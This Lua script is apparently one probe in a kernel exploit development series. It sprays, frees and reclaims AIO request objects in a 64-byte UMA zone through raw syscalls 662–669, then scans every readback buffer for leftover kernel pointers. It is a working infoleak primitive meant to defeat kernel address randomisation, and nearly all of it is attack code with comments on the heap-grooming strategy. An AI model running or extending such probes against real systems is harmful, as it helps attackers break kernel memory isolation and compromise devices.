-- CRASH_CLASS: LOW
-- PROBE 73b: AIO self-spray residual kernel data test
--
-- Zone isolation (doc 14) means ONLY AIO objects can reclaim R's 64B zone.
-- R+0x00/+0x08 contain kernel pointers NOT zeroed before uma_zfree.
-- UMA free list overwrites R+0x00 (free-list next ptr), R+0x08 survives.
--
-- Strategy: submit → delete (R freed, kptrs survive) → re-submit (same zone
-- reclaim) → check ALL readback interfaces for residual data.
--
-- Also: the request struct at +0x18 (result word) may contain kernel data
-- if the constructor doesn't fully initialize it.

print("=== PROBE 73b: AIO SELF-SPRAY RESIDUAL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local pid = N(mk(20)())
print("pid=" .. pid)

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end

local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)

local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)
local sc663 = mk(663)

local data_buf = memory.alloc(0x100)
local COUNT = 32

local function submit_batch(count)
    local ids_out = {}
    for i = 1, count do
        local req = memory.alloc(0x30)
        local id_buf = memory.alloc(8)
        wq(N(req) + 0x00, uint64(0))
        wq(N(req) + 0x08, uint64(64))
        wq(N(req) + 0x10, data_buf)
        wq(N(req) + 0x18, uint64(0xDEAD0000 + i))
        wq(N(req) + 0x20, uint64(fd_zero))
        local ret = N(sc669(uint64(1), req, uint64(1), uint64(1), id_buf))
        local id = rd(N(id_buf))
        if id and id < 0 then id = id + 0x100000000 end
        if id and id > 0 then
            ids_out[#ids_out + 1] = id
            -- Also read back the result word
            local rw = rq(N(req) + 0x18)
            if i <= 4 then
                print(string.format("    submit[%d] id=0x%X result_word=%s", i, id, fmt(rw)))
            end
        end
    end
    return ids_out
end

local function poll_batch(ids)
    for _, id in ipairs(ids) do
        pcall(function() sc664(uint64(id)) end)
    end
end

local function query_batch(ids)
    local results = {}
    for i, id in ipairs(ids) do
        local buf = memory.alloc(8)
        wd(N(buf), 0xCCCCCCCC)
        wd(N(buf) + 4, 0xCCCCCCCC)
        pcall(function() sc666(uint64(id), uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
        local lo = rd(N(buf))
        local hi = rd(N(buf) + 4)
        results[#results + 1] = {lo = lo, hi = hi}
    end
    return results
end

local function delete_batch(ids)
    local id_arr = memory.alloc(#ids * 4)
    local st_arr = memory.alloc(#ids * 4)
    for i, id in ipairs(ids) do
        wd(N(id_arr) + (i-1)*4, id)
        wd(N(st_arr) + (i-1)*4, 0xCCCCCCCC)
    end
    pcall(function() sc662(id_arr, uint64(#ids), st_arr, uint64(0), uint64(0), uint64(0)) end)
end

-- Phase 1: Submit and record baseline
print("")
print("[A] Phase 1: Submit " .. COUNT .. " AIO requests")
local ids1 = submit_batch(COUNT)
print("  submitted: " .. #ids1)
poll_batch(ids1)
print("  polled all")

-- Record baseline 666 output for first few
print("")
print("[B] Phase 1: 666 baseline query")
local baseline = query_batch(ids1)
for i = 1, math.min(8, #baseline) do
    print(string.format("  id=0x%X 666_lo=0x%08X 666_hi=0x%08X",
        ids1[i], baseline[i].lo or 0, baseline[i].hi or 0))
end

-- Phase 2: Delete all (R objects freed, kernel pointers survive in zone)
print("")
print("[C] Phase 2: Delete all " .. #ids1 .. " requests")
delete_batch(ids1)

-- Verify deletion
local check = query_batch(ids1)
local del_ok = 0
for _, c in ipairs(check) do
    if c.lo == 0x80020003 then del_ok = del_ok + 1 end
end
print("  deleted+confirmed: " .. del_ok .. "/" .. #ids1)

-- Phase 3: Re-submit (same zone reclaim — LIFO means new R reuses old R memory)
print("")
print("[D] Phase 3: Re-submit " .. COUNT .. " requests (same-zone reclaim)")
local ids2 = submit_batch(COUNT)
print("  re-submitted: " .. #ids2)
poll_batch(ids2)
print("  polled all")

-- Phase 4: Check new IDs through EVERY readback interface
print("")
print("[E] Phase 4: 666 query on reclaimed objects")
local reclaimed = query_batch(ids2)
for i = 1, math.min(8, #reclaimed) do
    local diff = ""
    if i <= #baseline and reclaimed[i].lo ~= baseline[i].lo then diff = " DIFFERENT" end
    print(string.format("  id=0x%X 666_lo=0x%08X 666_hi=0x%08X%s",
        ids2[i], reclaimed[i].lo or 0, reclaimed[i].hi or 0, diff))
end

-- Check 666 with LARGE output buffer (8-byte per ID?)
print("")
print("[F] Phase 4: 666 with 8-byte output per ID")
for i = 1, math.min(4, #ids2) do
    local buf = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(buf) + j, 0xCCCCCCCC) end
    pcall(function() sc666(uint64(ids2[i]), uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
    local d0 = rd(N(buf))
    local d1 = rd(N(buf) + 4)
    local d2 = rd(N(buf) + 8)
    local d3 = rd(N(buf) + 12)
    local q0 = rq(N(buf))
    print(string.format("  id=0x%X d0=0x%08X d1=0x%08X d2=0x%08X d3=0x%08X q0=%s",
        ids2[i], d0 or 0, d1 or 0, d2 or 0, d3 or 0, fmt(q0)))
end

-- Check 663 on reclaimed objects
print("")
print("[G] Phase 4: 663 on reclaimed objects")
for i = 1, math.min(4, #ids2) do
    local buf = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(buf) + j, 0xCCCCCCCC) end
    pcall(function() sc663(uint64(ids2[i]), uint64(1), buf, uint64(0), uint64(0), uint64(0)) end)
    local d0 = rd(N(buf))
    local d1 = rd(N(buf) + 4)
    local d2 = rd(N(buf) + 8)
    print(string.format("  id=0x%X d0=0x%08X d1=0x%08X d2=0x%08X",
        ids2[i], d0 or 0, d1 or 0, d2 or 0))
end

-- Phase 5: Multi-ID 662 delete with large output buffer
print("")
print("[H] Phase 5: 662 delete with oversized output buffer (16 bytes/ID)")
do
    local N_DEL = math.min(8, #ids2)
    local id_arr = memory.alloc(N_DEL * 4)
    local out_buf = memory.alloc(N_DEL * 16 + 64)
    for i = 1, N_DEL do wd(N(id_arr) + (i-1)*4, ids2[i]) end
    for j = 0, N_DEL * 16 + 60, 4 do wd(N(out_buf) + j, 0xCCCCCCCC) end

    pcall(function() sc662(id_arr, uint64(N_DEL), out_buf, uint64(0), uint64(0), uint64(0)) end)

    -- Dump all modified dwords
    print(string.format("  Deleted %d IDs, scanning %d bytes:", N_DEL, N_DEL * 16 + 64))
    local found_any = false
    for off = 0, N_DEL * 16 + 60, 4 do
        local d = rd(N(out_buf) + off)
        if d and d ~= 0xCCCCCCCC then
            found_any = true
            local marker = ""
            if off % 4 == 0 then
                local q = rq(N(out_buf) + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 then marker = " *** KPTR ***" end
                end
            end
            print(string.format("    +%03X: 0x%08X%s", off, d, marker))
        end
    end
    if not found_any then print("    no modifications beyond sentinel") end
end

-- Phase 6: Request struct readback after operations
print("")
print("[I] Phase 6: Request struct modification tracking")
print("  (Does the kernel write back to the 0x28-byte request struct?)")
do
    local req = memory.alloc(0x30)
    local id_buf = memory.alloc(8)
    -- Fill with known pattern
    for j = 0, 0x27 do wb(N(req) + j, 0xAA) end
    -- Set required fields
    wq(N(req) + 0x00, uint64(0))         -- offset
    wq(N(req) + 0x08, uint64(64))        -- nbytes
    wq(N(req) + 0x10, data_buf)          -- buf
    wq(N(req) + 0x18, uint64(0xBBBBBBBBBBBBBBBB))  -- result (sentinel)
    wq(N(req) + 0x20, uint64(fd_zero))   -- fd

    local ret = N(sc669(uint64(1), req, uint64(1), uint64(1), id_buf))

    -- Scan request struct after submit
    print("  After 669 submit (ret=" .. ret .. "):")
    for off = 0, 0x27 do
        local b = rb(N(req) + off)
        -- Only report offsets 0x18-0x1F (result word) and anything unexpected
        if off >= 0x18 and off <= 0x1F then
            print(string.format("    +0x%02X = 0x%02X", off, b or 0))
        end
    end

    -- Poll
    local id = rd(N(id_buf))
    if id and id < 0 then id = id + 0x100000000 end
    if id and id > 0 then
        pcall(function() sc664(uint64(id)) end)
        print("  After 664 poll:")
        for off = 0x18, 0x1F do
            local b = rb(N(req) + off)
            print(string.format("    +0x%02X = 0x%02X", off, b or 0))
        end

        -- Full result word as qword
        local rw = rq(N(req) + 0x18)
        print("  result_word = " .. fmt(rw))
        local rwh, rwl = get_hi_lo(rw)
        if rwh >= 0xFFFF8000 then
            print("  *** KERNEL POINTER IN RESULT WORD ***")
        end

        -- Delete
        local dbuf = memory.alloc(4)
        local ibuf = memory.alloc(4)
        wd(N(ibuf), id)
        pcall(function() sc662(ibuf, uint64(1), dbuf, uint64(0), uint64(0), uint64(0)) end)
        print("  After 662 delete:")
        for off = 0x18, 0x1F do
            local b = rb(N(req) + off)
            print(string.format("    +0x%02X = 0x%02X", off, b or 0))
        end
    end
end

-- Cleanup remaining ids2
print("")
print("[J] Cleanup")
-- Delete any remaining ids2 not already deleted in [H]
for i = 9, #ids2 do
    local db = memory.alloc(4)
    local ib = memory.alloc(4)
    wd(N(ib), ids2[i])
    pcall(function() sc662(ib, uint64(1), db, uint64(0), uint64(0), uint64(0)) end)
end

print("")
print("alive=YES")
print("=== PROBE 73b COMPLETE ===")
